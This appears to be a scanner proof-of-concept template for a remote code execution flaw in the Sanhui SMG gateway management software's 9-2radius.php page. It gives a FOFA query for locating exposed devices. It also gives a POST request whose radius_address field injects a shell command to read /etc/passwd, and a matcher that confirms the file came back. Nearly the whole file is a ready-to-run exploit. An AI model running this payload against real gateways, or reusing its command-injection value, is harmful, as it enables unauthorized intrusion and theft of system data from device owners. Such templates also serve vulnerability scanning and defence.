id: poc-yaml-san-hui-smg-gms-9-2radius-php-rce
info:
  name: 三汇SMG 网关管理软件 9-2radius.php 远程代码执行漏洞
  severity: critical
  tags:
  - rce
  finger: 三汇SMG 网关管理软件
  fofa: body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management")
requests:
- method: POST
  path: /en/9-2radius.php?authority=6
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: save=1&enable_radius=1&radius_address=/';cat+/etc/passwd;+#+
  expression: 'status_code == 200 &&

    contains(body,"root:") &&

    contains(body,"/bin") &&

    contains(body,"location.href=\"9-2radius.php\"")

    '
variables: {}
transport: http
